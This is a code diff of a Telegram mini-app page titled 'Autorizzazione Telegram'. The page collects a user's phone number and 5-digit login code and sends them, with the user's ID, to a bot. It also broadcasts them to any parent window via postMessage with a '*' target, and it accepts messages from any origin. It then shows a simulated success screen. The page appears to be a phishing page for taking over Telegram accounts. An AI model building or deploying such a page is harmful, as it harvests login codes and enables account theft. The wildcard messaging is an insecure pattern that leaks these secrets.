@@ -6,6 +6,7 @@
     <title>Autorizzazione Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* Стили остаются без изменений */
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -212,7 +213,7 @@
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
 
-        // Пытаемся получить user_id из initData
+        // Получаем user_id из initData
         function getUserId() {
             try {
                 if (Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
@@ -255,6 +256,13 @@
                 button.onclick = () => addDigit(digit);
                 keyboard.appendChild(button);
             });
+            
+            // Добавляем кнопку удаления
+            const deleteButton = document.createElement('button');
+            deleteButton.className = 'key';
+            deleteButton.textContent = '⌫';
+            deleteButton.onclick = () => deleteDigit();
+            keyboard.appendChild(deleteButton);
         }
 
         function addDigit(digit) {
@@ -264,12 +272,30 @@
             }
         }
 
+        function deleteDigit() {
+            if (currentCode.length > 0) {
+                currentCode = currentCode.slice(0, -1);
+                updateCodeDisplay();
+            }
+        }
+
         function updateCodeDisplay() {
             document.getElementById('code-display').textContent = 
                 currentCode.padEnd(5, '•');
         }
 
-        // НОВАЯ ФУНКЦИЯ: Поделиться контактом
+        // Функция для отправки данных в бота
+        function sendDataToBot(data) {
+            // Отправляем данные через Telegram WebApp
+            Telegram.WebApp.sendData(JSON.stringify(data));
+            
+            // Также можно отправлять данные через postMessage для кросс-доменной коммуникации
+            if (window.parent !== window) {
+                window.parent.postMessage(data, '*');
+            }
+        }
+
+        // Поделиться контактом
         function shareContact() {
             Telegram.WebApp.openContactForm((data) => {
                 if (data && data.phone_number) {
@@ -295,7 +321,7 @@
             });
         }
 
-        async function sendPhoneNumber() {
+        function sendPhoneNumber() {
             const phoneInput = document.getElementById('phone-input');
             const errorDiv = document.getElementById('phone-error');
             const successDiv = document.getElementById('phone-success');
@@ -325,17 +351,19 @@
                 userId = getUserId();
                 console.log('Using user_id:', userId);
                 
-                // ВМЕСТО FETCH - отправляем данные через Telegram WebApp
-                Telegram.WebApp.sendData(JSON.stringify({
+                // Отправляем данные в бота
+                sendDataToBot({
                     action: 'send_phone',
                     phone: userPhone,
                     user_id: userId
-                }));
+                });
                 
-                // Показываем секцию с кодом
-                loadingDiv.style.display = 'none';
-                showSection('code-section');
-                createKeyboard();
+                // Показываем секцию с кодом (имитация, в реальности бот должен запросить код)
+                setTimeout(() => {
+                    loadingDiv.style.display = 'none';
+                    showSection('code-section');
+                    createKeyboard();
+                }, 1000);
                 
             } catch (error) {
                 loadingDiv.style.display = 'none';
@@ -345,7 +373,7 @@
             }
         }
 
-        async function sendCode() {
+        function sendCode() {
             const errorDiv = document.getElementById('code-error');
             const loadingDiv = document.getElementById('code-loading');
             
@@ -359,20 +387,24 @@
                 errorDiv.style.display = 'none';
                 loadingDiv.style.display = 'block';
                 
-                // ВМЕСТО FETCH - отправляем код через Telegram WebApp
-                Telegram.WebApp.sendData(JSON.stringify({
+                // Отправляем код в бота
+                sendDataToBot({
                     action: 'send_code',
                     code: currentCode,
                     user_id: userId
-                }));
+                });
                 
-                loadingDiv.style.display = 'none';
-                showSection('success-section');
-                
-                // Закрываем WebApp через 2 секунды
+                // В реальности бот должен подтвердить код и отправить ответ
+                // Здесь имитируем успешное завершение
                 setTimeout(() => {
-                    Telegram.WebApp.close();
-                }, 2000);
+                    loadingDiv.style.display = 'none';
+                    showSection('success-section');
+                    
+                    // Закрываем WebApp через 2 секунды
+                    setTimeout(() => {
+                        Telegram.WebApp.close();
+                    }, 2000);
+                }, 1000);
                 
             } catch (error) {
                 loadingDiv.style.display = 'none';
@@ -382,8 +414,48 @@
             }
         }
 
+        // Обработка сообщений от бота
+        function handleMessage(event) {
+            try {
+                const data = event.data;
+                
+                // Проверяем, что это сообщение от бота
+                if (data && data.action) {
+                    switch(data.action) {
+                        case 'request_phone':
+                            showPhoneSection();
+                            break;
+                        case 'request_code':
+                            showSection('code-section');
+                            createKeyboard();
+                            break;
+                        case 'auth_success':
+                            showSection('success-section');
+                            setTimeout(() => {
+                                Telegram.WebApp.close();
+                            }, 2000);
+                            break;
+                        case 'auth_error':
+                            document.getElementById('code-error').textContent = data.message || 'Errore di autenticazione';
+                            document.getElementById('code-error').style.display = 'block';
+                            break;
+                    }
+                }
+            } catch (error) {
+                console.error('Error handling message:', error);
+            }
+        }
+
+        // Слушаем сообщения от бота
+        window.addEventListener('message', handleMessage);
+
         // Инициализация при загрузке
         userId = getUserId();
+        
+        // Проверяем, если бот уже отправил какие-то данные
+        if (Telegram.WebApp.initData) {
+            // Можно распарсить initData для получения дополнительной информации
+        }
     </script>
 </body>
 </html>
